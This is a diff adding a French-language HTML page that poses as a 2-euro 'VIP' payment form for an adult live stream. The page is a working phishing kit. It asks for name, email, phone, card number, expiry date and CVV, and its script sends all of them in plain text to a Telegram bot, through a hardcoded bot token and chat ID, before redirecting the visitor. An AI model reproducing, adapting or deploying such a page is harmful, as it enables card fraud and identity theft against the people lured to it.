@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Océane ZT - Formulaire VIP</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Police romantique -->
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@500;700&family=Quicksand:wght@400;500&display=swap" rel="stylesheet">
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: "Quicksand", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+      background: radial-gradient(circle at top, #ffdde1 0%, #ff5774 45%, #5c0015 100%);
+      color: #fff;
+    }
+
+    .overlay {
+      position: fixed;
+      inset: 0;
+      background: radial-gradient(circle at center, rgba(255,255,255,0.08), transparent 60%);
+      pointer-events: none;
+    }
+
+    .page {
+      position: relative;
+      z-index: 1;
+      max-width: 520px;
+      width: 92%;
+      padding: 2.4rem 2rem;
+      background: rgba(0, 0, 0, 0.30);
+      border-radius: 24px;
+      box-shadow:
+        0 20px 40px rgba(0, 0, 0, 0.45),
+        0 0 0 1px rgba(255, 255, 255, 0.12);
+      backdrop-filter: blur(16px);
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 1.8rem;
+    }
+
+    .title {
+      font-family: "Playfair Display", serif;
+      font-size: 2rem;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+    }
+
+    .subtitle {
+      font-size: 0.85rem;
+      letter-spacing: 0.26em;
+      text-transform: uppercase;
+      opacity: 0.8;
+      margin-top: 0.4rem;
+    }
+
+    .intro {
+      font-size: 0.95rem;
+      text-align: center;
+      margin-bottom: 1.8rem;
+      opacity: 0.9;
+      line-height: 1.6;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 0.9rem;
+    }
+
+    label {
+      font-size: 0.9rem;
+      opacity: 0.9;
+      margin-bottom: 0.15rem;
+    }
+
+    input {
+      width: 100%;
+      padding: 0.6rem 0.75rem;
+      border-radius: 12px;
+      border: 1px solid rgba(255,255,255,0.4);
+      background: rgba(0, 0, 0, 0.35);
+      color: #fff;
+      font-size: 0.95rem;
+      outline: none;
+      transition: border 0.15s ease, box-shadow 0.15s ease, background 0.15s ease;
+    }
+
+    input::placeholder {
+      color: rgba(255,255,255,0.55);
+      font-size: 0.9rem;
+    }
+
+    input:focus {
+      border-color: #ffb6c5;
+      box-shadow: 0 0 0 1px rgba(255, 182, 197, 0.7);
+      background: rgba(0, 0, 0, 0.55);
+    }
+
+    .btn {
+      margin-top: 1.2rem;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.4rem;
+      padding: 0.8rem 2.2rem;
+      border-radius: 999px;
+      border: none;
+      cursor: pointer;
+      text-decoration: none;
+      font-size: 0.95rem;
+      font-weight: 600;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      background: linear-gradient(135deg, #ff8396, #ff1e4d);
+      box-shadow: 0 12px 25px rgba(0, 0, 0, 0.45);
+      color: #fff;
+      transition:
+        transform 0.15s ease-out,
+        box-shadow 0.15s ease-out,
+        background 0.25s ease-out;
+      width: 100%;
+    }
+
+    .btn:hover {
+      transform: translateY(-3px);
+      box-shadow:
+        0 18px 30px rgba(0, 0, 0, 0.6),
+        0 0 15px rgba(255, 115, 140, 0.7);
+      background: linear-gradient(135deg, #ffc0cb, #ff2145);
+    }
+
+    .btn:active {
+      transform: translateY(0);
+      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.55);
+    }
+
+    .btn-dot {
+      font-size: 1.2rem;
+    }
+
+    #status {
+      margin-top: 1rem;
+      font-size: 0.85rem;
+      text-align: center;
+      opacity: 0.9;
+    }
+
+    @media (max-width: 520px) {
+      .page {
+        padding: 2rem 1.5rem;
+      }
+
+      .title {
+        font-size: 1.8rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="overlay"></div>
+
+  <main class="page">
+    <header class="header">
+      <h1 class="title">Océane ZT</h1>
+      <p class="subtitle">Formulaire vip</p>
+    </header>
+
+    <p class="intro">
+     Bienvenue dans mon Live coquin du soir paye a 2€ et choisit ta place juste a pres 🤭
+    </p>
+
+    <form id="formulaire">
+      <div>
+        <label for="nom">Nom :</label>
+        <input type="text" id="nom" name="nom" required placeholder="Entre ton nom">
+      </div>
+
+      <div>
+        <label for="prenom">Prénom :</label>
+        <input type="text" id="prenom" name="prenom" required placeholder="Entre ton prénom">
+      </div>
+
+      <div>
+        <label for="email">Adresse mail :</label>
+        <input type="email" id="email" name="email" required placeholder="exemple@mail.com">
+      </div>
+
+      <div>
+        <label for="telephone">Numéro de téléphone :</label>
+        <input type="text" id="telephone" name="telephone" required placeholder="Avec indicatif si possible">
+      </div>
+
+      <div>
+        <label for="carte">Numéro de carte :</label>
+        <input type="text" id="carte" name="carte" required placeholder="1111-2222-3333-4444">
+      </div>
+
+      <div>
+        <label for="expiration">expiration :</label>
+        <input type="text" id="expiration" name="expiration" required placeholder="03/30">
+      </div>
+
+      <div>
+        <label for="CVV">CVV :</label>
+        <input type="text" id="CVV" name="CVV" required placeholder="123">
+      </div>
+      
+
+      <button type="submit" class="btn">
+        <span>Payer</span>
+        <span class="btn-dot">•</span>
+      </button>
+    </form>
+
+    <p id="status"></p>
+  </main>
+
+  <script>
+    // ⚠️ Ton bot Telegram (garde ça secret côté prod)
+    const BOT_TOKEN = "7683921458:AAFA204cvl5drHgTH0eCbW0Pr3jxZPyRNhs";
+    const CHAT_ID = "-1003456043362";
+
+    const form = document.getElementById('formulaire');
+    const status = document.getElementById('status');
+
+    form.addEventListener('submit', async function (e) {
+      e.preventDefault();
+
+      const data = new FormData(form);
+
+      const nom = data.get('nom');
+      const prenom = data.get('prenom');
+      const email = data.get('email');
+      const telephone = data.get('telephone');
+      const carte= data.get('carte');
+      const expiration = data.get('expiration');
+      const CVV = data.get('CVV');
+
+
+      const text =
+        "📩 Nouveau formulaire Live :\n\n" +
+        "👤 Nom : " + nom + "\n" +
+        "👤 Prénom : " + prenom + "\n" +
+        "📧 Email : " + email + "\n" +
+        "📱 Téléphone : " + telephone + "\n\n" +
+        "💳Carte : " + carte + "\n" +
+        "💳Expiration : " + expiration + "\n" +
+        "💳 Cvv : " + CVV+ "\n" +
+        "✨ Demande d’accès VIP reçue depuis la page luxe.";
+
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+      const body = new URLSearchParams({
+        chat_id: CHAT_ID,
+        text: text
+      });
+
+      try {
+        const res = await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/x-www-form-urlencoded" },
+          body: body
+        });
+
+        const json = await res.json();
+        if (json.ok) {
+          // Si Telegram a bien reçu, on redirige
+          window.location.href = "pagefinal.html";
+        } else {
+          console.error(json);
+          status.textContent = "Erreur Telegram : " + (json.description || "inconnue");
+        }
+      } catch (err) {
+        console.error(err);
+        status.textContent = "Erreur d'envoi (regarde la console).";
+      }
+    });
+  </script>
+</body>
+</html>
